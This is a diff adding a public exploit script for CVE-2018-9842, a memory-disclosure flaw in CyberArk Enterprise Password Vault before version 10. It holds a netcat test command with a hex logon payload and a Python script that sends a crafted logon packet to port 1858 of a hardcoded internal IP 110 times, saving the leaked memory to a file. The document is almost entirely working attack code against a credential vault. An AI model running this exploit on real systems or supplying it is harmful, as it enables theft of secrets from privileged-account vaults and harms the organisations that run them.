@@ -1,0 +1,46 @@
+# Exploit Title: CyberArk < 10 - Memory Disclosure
+# Date: 2018-06-04
+# Exploit Author: Thomas Zuk
+# Vendor Homepage: https://www.cyberark.com/products/privileged-account-security-solution/enterprise-password-vault/
+# Version: < 9.7 and < 10
+# Tested on: Windows 2008, Windows 2012, Windows 7, Windows 8, Windows 10
+# CVE: CVE-2018-9842
+
+# Linux cmd line manual test: cat logon.bin | nc -vv IP 1858 | xxd
+# paste the following bytes into a hexedited file named logon.bin:
+#fffffffff7000000ffffffff3d0100005061636c695363726970745573657200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020202020ffffffff0000000000000000000073000000cececece00000000000000000000000000000000303d4c6f676f6efd3131353d372e32302e39302e3238fd36393d50fd3131363d30fd3130303dfd3231373d59fd3231383d5041434c49fd3231393dfd3331373d30fd3335373d30fd32323d5061636c6953637269707455736572fd3336373d3330fd0000
+
+
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+ip = "10.107.32.21"
+port = 1858
+
+# Cyber Ark port 1858 is a proprietary software and protocol to perform login and administrative services.
+# The below is a sample login request that is needed to receive the memory
+
+pacli_logon = "\xff\xff\xff\xff\xf7\x00\x00\x00\xff\xff\xff\xff\x3d\x01\x00\x00\x50\x61\x63\x6c\x69\x53\x63\x72\x69\x70\x74\x55\x73\x65\x72\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x20\x20\x20\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x73\x00\x00\x00\xce\xce\xce\xce\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x30\x3d\x4c\x6f\x67\x6f\x6e\xfd\x31\x31\x35\x3d\x37\x2e\x32\x30\x2e\x39\x30\x2e\x32\x38\xfd\x36\x39\x3d\x50\xfd\x31\x31\x36\x3d\x30\xfd\x31\x30\x30\x3d\xfd\x32\x31\x37\x3d\x59\xfd\x32\x31\x38\x3d\x50\x41\x43\x4c\x49\xfd\x32\x31\x39\x3d\xfd\x33\x31\x37\x3d\x30\xfd\x33\x35\x37\x3d\x30\xfd\x32\x32\x3d\x50\x61\x63\x6c\x69\x53\x63\x72\x69\x70\x74\x55\x73\x65\x72\xfd\x33\x36\x37\x3d\x33\x30\xfd\x00\x00"
+
+
+for iteration in range(0, 110):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    s.send(pacli_logon)
+
+    # recieve response
+    s.recv(200)
+    reply = s.recv(1500)
+
+    # write responses to file
+    file = open("cyberark_memory", "a")
+
+    file.write("received: \n")
+    file.write(reply)
+    file.write("\n\n\n")
+    file.close()
+
+    s.close()
